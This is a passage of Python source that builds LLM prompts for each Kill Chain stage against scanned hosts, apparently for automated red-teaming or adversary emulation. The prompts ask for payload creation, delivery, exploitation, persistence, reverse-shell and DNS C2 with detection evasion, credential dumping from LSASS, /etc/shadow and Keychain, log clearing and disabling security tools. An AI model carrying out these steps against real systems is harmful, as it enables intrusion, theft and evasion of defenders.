1. Analyze reconnaissance findings - what vulnerabilities were identified?
2. Create payload APPROPRIATE for {platform} platform
3. Match payload type to platform requirements:
   - Windows: .exe (PE), .ps1 (PowerShell), or .bat (batch)
   - Linux: .sh (shell script) or ELF binary
   - macOS: .sh (shell) or .app (bundle)
4. Include specific artifact names (e.g., payload.exe, backdoor.sh, update.ps1)
5. Consider security controls for evasion techniques
6. Reference specific vulnerabilities from Stage 1
7. Map to MITRE techniques (T1587.001, T1588.001, T1566, etc.)

CRITICAL FORMAT REQUIREMENT - Your response MUST include:

## Weaponization Summary
[Description of payload creation for {platform}]

### Tools and Methods
- [Tool name]: [Description]

### Artifact Details
- **Artifact Name**: [EXACT filename: payload.exe OR exploit.sh OR other specific name]
- **Target Platform**: {platform}
- **Payload Type**: [Description, e.g., "Windows x64 Meterpreter"]

### Creation Command
```
[Specific command: msfvenom, wget, curl, python, etc. with all parameters]
```

### MITRE Techniques
- [Technique]: [Description]

STRICT RULES FOR EXTRACTION:
1. ALWAYS include "### Artifact Details" section
2. ALWAYS include "- **Artifact Name**:" with specific filename
3. ALWAYS include code block with creation command
4. DO NOT use vague names - be specific to platform and vulnerability
5. Reference ACTUAL vulnerabilities from Stage 1"""
    
    @staticmethod
    def build_delivery_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 3: Delivery - USE ACTUAL ARTIFACT AND AVAILABLE SERVICES.
        
        Delivers the ACTUAL payload created in Stage 2
        using ACTUAL available services from Stage 1.
        Not hardcoded to any specific delivery method.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Recon findings
        if context.reconnaissance:
            sections.append(f"STAGE 1 RECONNAISSANCE:\n{context.reconnaissance[:400]}")
        
        # Weaponization - what payload was created?
        if context.weaponization:
            sections.append(f"STAGE 2 PAYLOAD:\n{context.weaponization[:400]}")
        
        # Available services and ports
        network_info = []
        if host.Services:
            ports = [str(svc.Port) for svc in host.Services if svc.Port]
            network_info.append(f"- Open Ports: {', '.join(ports)}")
            service_list = []
            for svc in host.Services:
                svc_desc = f"Port {svc.Port}: {svc.ServiceName or 'unknown'}"
                if svc.Product:
                    svc_desc += f" ({svc.Product}"
                    if svc.Version:
                        svc_desc += f" {svc.Version}"
                    svc_desc += ")"
                service_list.append(svc_desc)
            network_info.append(f"- Services: {pb._format_list(service_list)}")
        if network_info:
            sections.append("AVAILABLE DELIVERY VECTORS:\n" + "\n".join(network_info))
        
        target_info = "\n\n".join(sections)
        
        return f"""STAGE 3: DELIVERY - USE ACTUAL PAYLOAD AND SERVICES

{target_info}

YOUR TASK - DELIVER PAYLOAD VIA AVAILABLE SERVICES:
1. The payload from Stage 2 must be delivered to the target
2. Use ONLY the ports and services actually available (from Stage 1)
3. Match delivery method to:
   - Available services (SSH, HTTP, SMB, etc.)
   - Identified vulnerabilities from Stage 1
   - Payload type from Stage 2 (exe, sh, ps1, etc.)
4. If multiple services available: SSH (port 22), HTTP (port 80), SMB (port 445), RDP (port 3389), etc.
5. Provide step-by-step delivery procedure
6. Include specific commands or Metasploit steps
7. Map to MITRE techniques (T1566, T1190, T1566.002, etc.)

DELIVERY METHODS BASED ON AVAILABLE SERVICES:
- SSH available: Use SSH injection, key-based auth, or direct shell execution
- HTTP/HTTPS available: Use wget, curl, Invoke-WebRequest, or direct download
- SMB available: Use file share injection, PsExec, or direct SMB exploitation
- RDP available: Use RDP injection or session hijacking
- Custom services: Exploit service-specific vulnerabilities

CRITICAL REQUIREMENT:
- Reference the EXACT payload name from Stage 2
- Use ONLY ports/services from Stage 1 reconnaissance
- Do NOT invent new attack methods not found in recon

Your response must include step-by-step delivery procedure (commands or detailed steps)."""
    
    @staticmethod
    def build_exploitation_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 4: Exploitation - USE ACTUAL VULNERABILITIES FROM STAGE 1.
        
        Executes exploitation using specific CVEs/weaknesses identified
        in reconnaissance. Not hardcoded to specific CVEs.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Summary of attack chain so far
        if context.reconnaissance:
            sections.append(f"STAGE 1 RECON: {context.reconnaissance[:250]}")
        if context.weaponization:
            sections.append(f"STAGE 2 PAYLOAD: {context.weaponization[:250]}")
        if context.delivery:
            sections.append(f"STAGE 3 DELIVERY: {context.delivery[:250]}")
        
        # Specific vulnerabilities to exploit
        if host.Services:
            vuln_list = []
            for svc in host.Services:
                if svc.Vulnerabilities:
                    for vuln in svc.Vulnerabilities:
                        vuln_desc = f"{vuln.template_id or 'Unknown'}"
                        if vuln.info:
                            if vuln.info.name:
                                vuln_desc += f": {vuln.info.name}"
                            if vuln.info.classification and vuln.info.classification.cvss_score:
                                vuln_desc += f" (CVSS: {vuln.info.classification.cvss_score})"
                        vuln_desc += f" on port {svc.Port}"
                        vuln_list.append(vuln_desc)
            if vuln_list:
                sections.append(f"VULNERABILITIES TO EXPLOIT:\n  • {chr(10).join(vuln_list)}")
        
        target_info = "\n\n".join(sections)
        
        return f"""STAGE 4: EXPLOITATION - TRIGGER ACTUAL VULNERABILITIES

{target_info}

YOUR TASK - EXPLOIT SPECIFIC VULNERABILITIES:
1. Execute the delivery method from Stage 3
2. Exploit SPECIFIC CVEs/vulnerabilities identified in Stage 1 recon
3. Confirm successful exploitation and verify access level achieved
4. Include detailed step-by-step exploitation procedure
5. Show commands or techniques specific to identified vulnerabilities
6. Map to MITRE Initial Access techniques (T1190, T1203, T1566, etc.)

CRITICAL - DO NOT ASSUME:
- Do NOT assume EternalBlue unless it was in Stage 1 recon
- Do NOT assume specific CVEs not in Stage 1 findings
- Use ACTUAL vulnerabilities and services from recon
- If no specific CVE found, exploit generic weaknesses (weak auth, misconfiguration, etc.)

Your response must include:
- Specific exploitation procedure (step-by-step)
- CVE or vulnerability exploited
- Confirmation of successful initial access"""
    
    @staticmethod
    def build_installation_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 5: Installation - USE ACTUAL ARTIFACT NAME AND OS-SPECIFIC PERSISTENCE.
        
        Establishes persistence using the EXACT payload from Stage 2.
        Uses OS-appropriate persistence mechanism (Windows/Linux/macOS).
        CRITICAL for artifact continuity.
        """
        pb = PromptBuilder
        
        platform = host.platform or "UNKNOWN"
        sections = []
        
        # Weaponization payloads (CRITICAL for artifact names)
        if context.weaponization:
            sections.append(f"PAYLOADS FROM STAGE 2:\n{context.weaponization[:400]}")
        
        # Delivery and exploitation confirmation
        if context.delivery:
            sections.append(f"DELIVERY METHOD: {context.delivery[:250]}")
        if context.exploitation:
            sections.append(f"EXPLOITATION RESULT: {context.exploitation[:250]}")
        
        # Target OS for persistence selection
        platform_info = [f"- Platform: {platform}"]
        sections.append("TARGET CONTEXT FOR PERSISTENCE:\n" + "\n".join(platform_info))
        
        target_info = "\n\n".join(sections)
        
        # Platform-specific persistence guidance
        persistence_guidance = {
            "windows": "Use Windows persistence methods: Scheduled Tasks (schtasks.exe), Registry Run Keys, Services (sc.exe), or Startup folders. Use cmd.exe syntax for schtasks commands.",
            "linux": "Use Linux persistence methods: Cron jobs, systemd services, shell profile modifications (.bashrc, .bash_profile), or init scripts.",
            "macos": "Use macOS persistence methods: LaunchAgent/LaunchDaemon plists, shell profile modifications, or cron jobs.",
        }
        
        platform_lower = platform.lower()
        guidance = "Use OS-appropriate persistence mechanism. Analyze platform from Stage 1 recon."
        for key, val in persistence_guidance.items():
            if key in platform_lower:
                guidance = val
                break
        
        return f"""STAGE 5: INSTALLATION & PERSISTENCE - {platform.upper()} SPECIFIC

{target_info}

PERSISTENCE METHOD FOR {platform}:
{guidance}

YOUR TASK - ESTABLISH PERSISTENCE:
1. Upload/transfer the EXACT artifact names from Stage 2 to target
2. Use the delivery method confirmed in Stage 3
3. Create persistence mechanism APPROPRIATE for {platform}
4. Ensure persistence survives reboot and system restarts
5. Reference artifact names FROM Stage 2 BY NAME (critical for continuity!)
6. Map to MITRE techniques (T1105, T1053, T1543, T1547, T1037, etc.)

CRITICAL CONTINUITY RULES:
✓ "Upload {{"filename"}} (created in Stage 2) to target location"
✓ Reference exact payload names from Weaponization
✓ Use platform-specific paths:
  - Windows: C:\\Temp\\, C:\\Windows\\Temp\\, C:\\ProgramData\\, %APPDATA%\\
  - Linux: /tmp/, /var/tmp/, /home/user/.config/, /var/lib/
  - macOS: /tmp/, /var/tmp/, /Library/, ~/Library/

PERSISTENCE METHODS BY PLATFORM:
- Windows: schtasks (scheduled tasks), Registry HKCU\\Run, Registry HKLM\\Run, Services
- Linux: cron (@reboot, hourly, daily), systemd services, .bashrc, /etc/rc.local
- macOS: LaunchAgent (~\\/Library\\/LaunchAgents), LaunchDaemon (\\/Library\\/LaunchDaemons), cron

Your response MUST include:
- Specific upload/transfer commands (with artifact name)
- Persistence mechanism setup (with exact commands)
- File locations and permissions
- Verification steps"""
    
    @staticmethod
    def build_command_and_control_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 6: Command & Control - ADAPTIVE TO PLATFORM AND PERSISTENCE.
        
        Establishes C2 channel appropriate for the payload and target platform.
        Uses actual network exposure and security controls from Stage 1.
        """
        pb = PromptBuilder
        
        platform = host.platform or "UNKNOWN"
        sections = []
        
        # Attack progression
        attack_summary = []
        if context.reconnaissance:
            attack_summary.append(f"Recon: {context.reconnaissance[:120]}")
        if context.weaponization:
            attack_summary.append(f"Payload: {context.weaponization[:120]}")
        if context.installation:
            attack_summary.append(f"Persistence: {context.installation[:120]}")
        if attack_summary:
            sections.append("ATTACK PROGRESSION:\n" + "\n".join(attack_summary))
        
        chain_info = "\n\n".join(sections)
        
        # Platform-specific C2 guidance
        c2_guidance = {
            "windows": "Use HTTP/HTTPS-based C2 (Meterpreter, Empire), DNS tunneling, or SMTP for egress. Consider PowerShell callbacks.",
            "linux": "Use HTTP/HTTPS-based C2, DNS tunneling, or reverse shell protocols (netcat, bash). Shell-based callbacks ideal.",
            "macos": "Use HTTP/HTTPS-based C2, reverse shells via bash/sh, or custom Python/Ruby callbacks.",
        }
        
        platform_lower = platform.lower()
        c2_guide = "Use C2 appropriate for platform and network constraints."
        for key, val in c2_guidance.items():
            if key in platform_lower:
                c2_guide = val
                break
        
        return f"""STAGE 6: COMMAND & CONTROL - {platform.upper()} ADAPTED

{chain_info}

C2 METHODS FOR {platform}:
{c2_guide}

YOUR TASK - ESTABLISH C2 CHANNEL:
1. C2 setup FROM the persistent payload established in Stage 5
2. Consider network exposure (internet vs internal)
3. Account for firewall rules and security monitoring
4. Choose protocol appropriate for:
   - Payload type from Stage 2
   - Network exposure from Stage 1
   - Persistence method from Stage 5
5. Include detailed C2 setup (protocols, tools, listeners)
6. Map to MITRE C2 techniques (T1071, T1573, T1008, T1572, T1090, etc.)

C2 PROTOCOL OPTIONS:
- HTTP/HTTPS: Most common, harder to detect if encrypted
- DNS: Stealthy, works through firewalls
- SMTP/POP3: Mail-based, unusual but possible
- Custom protocols: More evasive but complex
- Reverse shell: Direct callback for interactive shell access

Your response must include:
- Selected C2 protocol and justification
- Setup steps (listener on attacker side, callback from payload)
- Commands to test C2 connectivity
- Evasion techniques for detection avoidance"""
    
    @staticmethod
    def build_actions_on_objectives_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 7: Actions on Objectives WITH FULL ATTACK CHAIN CONTEXT.
        
        Determines post-exploitation objectives based on complete attack chain.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Full attack chain
        chain_summary = []
        if context.reconnaissance:
            chain_summary.append(f"1. Recon: {context.reconnaissance[:120]}...")
        if context.weaponization:
            chain_summary.append(f"2. Payload: {context.weaponization[:120]}...")
        if context.delivery:
            chain_summary.append(f"3. Delivery: {context.delivery[:120]}...")
        if context.exploitation:
            chain_summary.append(f"4. Exploitation: {context.exploitation[:120]}...")
        if context.installation:
            chain_summary.append(f"5. Installation: {context.installation[:120]}...")
        if context.command_and_control:
            chain_summary.append(f"6. C2: {context.command_and_control[:120]}...")
        if chain_summary:
            sections.append("FULL ATTACK CHAIN:\n" + "\n".join(chain_summary))
        
        chain_info = "\n\n".join(sections)
        
        # Platform-specific objectives
        objectives_map = {
            "windows": [
                "Credential harvesting (SAM hive, LSASS)",
                "Domain privilege escalation (LDAP enumeration)",
                "Data exfiltration (file shares, databases)",
                "Lateral movement (Windows credentials, Kerberos)",
                "System reconnaissance (net, ipconfig, tasklist)"
            ],
            "linux": [
                "Credential harvesting (/etc/shadow, .ssh keys)",
                "System reconnaissance (uname, netstat, ps)",
                "Data exfiltration (file access, mounted shares)",
                "Lateral movement (SSH keys, sudo abuse)",
                "Persistence enhancement (rootkit, kernel module)"
            ],
            "macos": [
                "Credential harvesting (Keychain, system.keychain)",
                "Data exfiltration (user files, Documents, iCloud)",
                "Lateral movement (SSH keys, local admin)",
                "System reconnaissance (system_profiler)",
                "Persistence (LaunchDaemon, kernel extension)"
            ],
        }
        
        platform_lower = (host.Os or "unknown").lower()
        default_objectives = [
            "Credential harvesting from local storage",
            "Data discovery and exfiltration",
            "Lateral movement within network",
            "System reconnaissance and mapping",
            "Persistence enhancement"
        ]
        
        objectives = default_objectives
        for key, val in objectives_map.items():
            if key in platform_lower:
                objectives = val
                break
        
        objectives_list = "\n".join([f"   - {obj}" for obj in objectives])
        
        return f"""STAGE 7: ACTIONS ON OBJECTIVES - {(host.Os or "UNKNOWN").upper()} POST-EXPLOITATION

{chain_info}

OBJECTIVES FOR {(host.Os or "UNKNOWN").upper()}:
{objectives_list}

YOUR TASK - DEFINE POST-EXPLOITATION ACTIONS:
1. Based on full attack chain from Stages 1-6 above
2. Based on platform and available access
3. Based on data sensitivity and business value
4. Include specific commands/techniques for each objective
5. Map to MITRE objectives (T1020, T1557, T1005, T1041, T1537, T1005, T1021, etc.)
6. Estimate time and detection risk for each action

REQUIRED OUTPUT FORMAT:
Include an "### Artifact Details" section with:
- **Artifact Name**: Specific objective artifact (e.g., "credentials_harvested", "admin_account", "database_backup")
- **Artifact Type**: Type of objective achieved
- **Actions**: Specific commands to achieve objective

Actions to consider:
- Credentials: Dump hashes, extract API keys, steal SSH keys
- Data: Find sensitive files, copy databases, export configurations
- Lateral: Enumerate network, compromise additional systems
- Coverage: Clear logs, disable security tools, modify timestamps"""
